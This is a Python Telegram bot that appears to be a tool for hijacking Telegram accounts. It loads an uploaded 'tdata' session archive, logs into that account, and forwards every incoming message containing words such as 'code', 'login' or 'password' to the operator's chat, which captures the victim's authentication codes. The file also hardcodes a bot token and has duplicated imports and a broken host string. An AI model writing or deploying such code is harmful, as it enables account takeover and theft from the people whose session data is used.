import os
import zipfile
import asyncio
from flask import Flask, request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from opentele.tdata import TData
import os
import zipfile
import asyncio
from flask import Flask, request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from opentele.tdata import TData
from telethon import events

BOT_TOKEN = "9104214570:AAHxFRfpwtxwhPMoUPG-c85dBjDRCjzBtOQ"
MY_ID = 8617048286

app_flask = Flask(__name__)
application = None
loop = None

@app_flask.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    if application and loop:
        update = Update.de_json(request.get_json(force=True), application.bot)
        asyncio.run_coroutine_threadsafe(application.process_update(update), loop)
    return 'OK'

@app_flask.route('/')
def index():
    return 'Bot is running!'

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ID:
        return
    await update.message.reply_text("👋 Привет! Отправь мне ZIP-архив с папкой tdata, и я заступлю на дежурство за кодами.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ID:
        return

    doc = update.message.document
    if not doc.file_name.endswith('.zip'):
        await update.message.reply_text("❌ Пожалуйста, отправь папку tdata, запакованную в .zip архив!")
        return

    msg = await update.message.reply_text("⏳ Скачиваю архив и настраиваю сессию...")
    
    zip_path = "user_tdata.zip"
    extract_dir = "extracted_tdata"
    
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive(zip_path)

    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)

    tdata_folder = extract_dir
    for root, dirs, files in os.walk(extract_dir):
        if "tdata" in dirs or "key_datas" in files:
            tdata_folder = root
            break

    try:
        td = TData(tdata_folder)
        client = await td.ToTelethon()
        await client.connect()
        
        await msg.edit_text("✅ Вход по tdata выполнен успешно! Запускаю отслеживание кодов...")

        @client.on(events.NewMessage)
        async def catch_codes(event):
            text = event.raw_text.lower()
            keywords = ["код", "code", "авторизац", "вход", "login", "password"]
            
            if any(word in text for word in keywords):
                sender = await event.get_sender()
                sender_name = getattr(sender, 'title', None) or getattr(sender, 'first_name', 'Неизвестно')
                
                await context.bot.send_message(
                    chat_id=MY_ID,
                    text=f"🔑 **Пришел код!**\n\nОт: {sender_name}\nТекст:\n{event.raw_text}"
                )

        asyncio.create_task(client.run_until_disconnected())

    except Exception as e:
        await msg.edit_text(f"❌ Ошибка при входе через tdata: {e}")

async def setup_bot():
    global application, loop
    loop = asyncio.get_running_loop()
    
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    await application.initialize()
    
    # Устанавливаем вебхук на твой адрес Render
    render_url = os.environ.get("RENDER_EXTERNAL_URL")
    if render_url:
        webhook_url = f"{render_url}/{BOT_TOKEN}"
        await application.bot.set_webhook(webhook_url)
        print(f"Вебхук установлен: {webhook_url}")

    await application.start()

if __name__ == '__main__':
    loop_main = asyncio.new_event_loop()
    asyncio.set_event_loop(loop_main)
    loop_main.run_until_complete(setup_bot())
    
    port = int(os.environ.get("PORT", 10000))
    app_flask.run(host="0.0
    .0.0", port=port)
